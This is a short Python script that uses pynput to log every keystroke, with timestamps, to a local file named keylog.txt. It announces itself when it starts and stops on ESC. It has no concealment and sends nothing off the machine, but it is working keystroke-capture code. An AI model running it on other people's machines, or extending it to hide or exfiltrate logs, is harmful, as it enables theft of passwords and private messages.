from pynput import keyboard
import logging
from datetime import datetime

# Configure logging
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(message)s')

def on_press(key):
    try:
        # Log the key pressed
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # Handle special keys
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    # Stop the listener when 'esc' is pressed
    if key == keyboard.Key.esc:
        logging.info("Keylogger stopped.")
        return False

def start_keylogger():
    # Start the keylogger
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    print("Keylogger started. Press ESC to stop.")
    start_keylogger()
